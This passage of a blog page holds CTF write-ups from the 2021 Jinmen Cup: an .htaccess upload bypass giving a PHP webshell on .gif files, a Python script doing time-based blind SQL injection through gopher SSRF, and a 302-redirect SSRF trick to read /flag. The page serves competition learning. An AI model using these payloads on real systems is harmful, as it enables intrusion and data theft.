class="variable">$fileext</span>,<span class="variable">$type</span>) &amp;&amp; <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] &gt; <span class="number">204800</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;upload error&#x27;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$filename</span>=addslashes(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">            <span class="variable">$sql</span>=<span class="string">&quot;insert into img (filename) values (&#x27;<span class="subst">$filename</span>&#x27;)&quot;</span>;</span><br><span class="line">            <span class="variable">$conn</span>-&gt;query(<span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line">            <span class="variable">$sql</span>=<span class="string">&quot;select id from img where filename=&#x27;<span class="subst">$filename</span>&#x27;&quot;</span>;</span><br><span class="line">            <span class="variable">$result</span>=<span class="variable">$conn</span>-&gt;query(<span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$result</span>-&gt;num_rows &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">while</span>(<span class="variable">$row</span> = <span class="variable">$result</span>-&gt;fetch_assoc()) &#123;</span><br><span class="line">                    <span class="variable">$id</span>=<span class="variable">$row</span>[<span class="string">&quot;id&quot;</span>];</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],<span class="variable">$upload</span>.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$filename</span>);</span><br><span class="line">            header(<span class="string">&quot;Location: index.php?id=<span class="subst">$id</span>&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">elseif</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$id</span>=intval(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line">        <span class="variable">$sql</span>=<span class="string">&quot;select filename from img where id=<span class="subst">$id</span>&quot;</span>;</span><br><span class="line">        <span class="variable">$result</span>=<span class="variable">$conn</span>-&gt;query(<span class="variable">$sql</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$result</span>-&gt;num_rows &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">while</span>(<span class="variable">$row</span> = <span class="variable">$result</span>-&gt;fetch_assoc()) &#123;</span><br><span class="line">                <span class="variable">$filename</span>=<span class="variable">$row</span>[<span class="string">&quot;filename&quot;</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="variable">$img</span>=<span class="variable">$upload</span>.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$filename</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;<span class="subst">$img</span>&#x27;/&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;style&gt;</span><br><span class="line">      body&#123;</span><br><span class="line">   background:url(./back.jpg)  no-repeat right <span class="number">-160</span>px  ;</span><br><span class="line">   background-size:<span class="number">90</span>%;</span><br><span class="line">   background-attachment:fixed;</span><br><span class="line">  background-color: rgba(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0.8</span>);</span><br><span class="line">&#125;</span><br><span class="line">      &lt;/style&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+
+<p>看一眼 apache2.conf 配置文件</p>
+<p>apache2.conf</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;Directory &#x2F;var&#x2F;www&#x2F;&gt;</span><br><span class="line">    Options  Indexes FollowSymLinks</span><br><span class="line">    AllowOverride All </span><br><span class="line">    Require all granted</span><br><span class="line">&lt;&#x2F;Directory&gt;</span><br><span class="line">&lt;Directory ~ &quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;upload&#x2F;[a-f0-9]&#123;32&#125;&#x2F;&quot;&gt;</span><br><span class="line">        php_flag engine off</span><br><span class="line">&lt;&#x2F;Directory&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php_flag engine 设置为0，会关闭该目录和子目录的php解析</span><br></pre></td></tr></table></figure>
+
+<p>我们可以通过上传.htaccess文件来开启php解析</p>
+<p>经师傅们测试发现<code>&lt;file&gt;</code>标签的优先级高于<code>&lt;directory&gt;</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;Files &quot;*.gif&quot;&gt;</span><br><span class="line">SetHandler application&#x2F;x-httpd-php</span><br><span class="line">php_flag engine on</span><br><span class="line">&lt;&#x2F;Files&gt;</span><br></pre></td></tr></table></figure>
+
+<p>随便上传个gif，拿到shell，但是由于disable_funtions的限制，只能通过readfile读取文件</p>
+<p><img src="https://img-blog.csdnimg.cn/20210514224928587.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"></p>
+<p><img src="https://img-blog.csdnimg.cn/20210514224942846.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"></p>
+<p>payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell&#x3D;var_dump(file_get_contents(&#39;&#x2F;flag&#39;));</span><br><span class="line">shell&#x3D;var_dump(readfile(&#39;&#x2F;flag&#39;));</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h1 id="easysql"><a href="#easysql" class="headerlink" title="easysql"></a>easysql</h1><p>这题没看，记录下别人的wp</p>
+<p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>] ?? <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$url</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$a</span> = preg_match(<span class="string">&quot;/file|dict/i&quot;</span>, <span class="variable">$url</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$a</span>==<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ch</span> = curl_init();</span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$_GET</span>[<span class="string">&quot;url&quot;</span>]);</span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">    curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">    curl_close(<span class="variable">$ch</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>简单的ssrf，全端口探测，发现只开放80和3306</p>
+<p>想到ssrf<code>通过gopher协议攻击已知用户名无密码的mysql</code></p>
+<p>同时目录扫描发现admin.php</p>
+<p>结合题目为easysql</p>
+<p>猜测为admin.php进行post注入</p>
+<p>盲注点：<code>poc=1 and sleep(1)</code></p>
+<p>脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag=<span class="string">&#x27;flag is :&#x27;</span></span><br><span class="line">s = <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyz~!@#$%&#123;&#125;-_&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> ss <span class="keyword">in</span> s:</span><br><span class="line">        payload = <span class="string">&quot;poc=1)and if(substr((select user()),%d,1)=&#x27;%s&#x27;,sleep(5),0) and (1=1&quot;</span> % (i,ss)</span><br><span class="line"><span class="comment">#print(payload)</span></span><br><span class="line">        test =\</span><br><span class="line"><span class="string">&quot;&quot;&quot;POST /admin.php HTTP/1.1</span></span><br><span class="line"><span class="string">Host:127.0.0.1</span></span><br><span class="line"><span class="string">Accept: */* </span></span><br><span class="line"><span class="string">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string">Content-Length: %d</span></span><br><span class="line"><span class="string">Connection: close </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">%s</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span> % (<span class="built_in">len</span>(payload),payload)</span><br><span class="line">        tmp = urllib.parse.quote(test)</span><br><span class="line">        new = tmp.replace(<span class="string">&#x27;%0A&#x27;</span>,<span class="string">&#x27;%0D%0A&#x27;</span>)</span><br><span class="line">        new = new.replace(<span class="string">&#x27;%&#x27;</span>,<span class="string">&#x27;%25&#x27;</span>)</span><br><span class="line">        result = <span class="string">&#x27;_&#x27;</span>+new</span><br><span class="line"></span><br><span class="line">        url = <span class="string">&#x27;http://121.36.147.29:20001/?url=gopher://127.0.0.1:80/&#x27;</span>+result</span><br><span class="line">        print(url)</span><br><span class="line">        startTime=time.time()</span><br><span class="line">        data= requests.get(url).content[<span class="number">3400</span>:]</span><br><span class="line">        <span class="keyword">if</span>(time.time() - startTime &gt; <span class="number">5</span>):</span><br><span class="line">            flag += ss</span><br><span class="line">            <span class="built_in">print</span> flag</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h1 id="goos"><a href="#goos" class="headerlink" title="goos"></a>goos</h1><p><code>go语言</code>的题目。给了源码。</p>
+<p>大体看一下，存在<code>index.php</code> ，最终应该是通过这个来进行获取flag。</p>
+<p>然后看一下main.go文件。</p>
+<p>大致两块，<code>upload和vul</code>。</p>
+<p>upload应该是陷阱，没法利用的。</p>
+<p>主要是vul</p>
+<p><img src="https://img-blog.csdnimg.cn/20210514230126653.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70"></p>
+<p>看到这里：</p>
+<p><img src="https://img-blog.csdnimg.cn/20210514230140112.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70"><br>总体思路就比较清晰了，通过<code>302跳转</code>，来跳转到本地80端口的index.php，进而读取flag</p>
+<p>接下来的操作ez</p>
+<p>payload：</p>
+<p>构造：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:1234&#x2F;&#x2F;ip&#x2F;..</span><br></pre></td></tr></table></figure>
+<p>跳转到ip</p>
+<p>我们可以在vps上新建index.php</p>
+<p>内容为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;Location: http:&#x2F;&#x2F;127.0.0.1&#x2F;index.php?file&#x3D;&#x2F;flag&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>一个302跳转</p>
+<hr>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/j-M7gfVXdnxovWDiZGTihQ">『CTF』津门杯国际网络安全创新大赛 WP</a></p>
+<p><a target="_blank" rel="noopener" href="https://jan.show/?p=93">2021 津门杯 WEB</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/05/03/0CTF%202016%20piapiapia/" rel="prev" title="0CTF 2016 piapiapia">
+      <i class="fa fa-chevron-left"></i> 0CTF 2016 piapiapia
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8A%A0%E6%B2%B9%F0%9F%92%AA"><span class="nav-number">1.</span> <span class="nav-text">加油💪</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Hate-php"><span class="nav-number">2.</span> <span class="nav-text">Hate_php</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Power-cut"><span class="nav-number">3.</span> <span class="nav-text">Power_cut</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#UploadHub"><span class="nav-number">4.</span> <span class="nav-text">UploadHub</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#easysql"><span class="nav-number">5.</span> <span class="nav-text">easysql</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#goos"><span class="nav-number">6.</span> <span class="nav-text">goos</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">7.</span> <span class="nav-text">参考</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="程勇胜"
+      src="/images/cys.jpg">
+  <p class="site-author-name" itemprop="name">程勇胜</p>
+  <div class="site-description" itemprop="description">花有重开日，人无再少年</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">54</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="mailto:1216043519@qq.com" title="E-Mail → mailto:1216043519@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">程勇胜</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
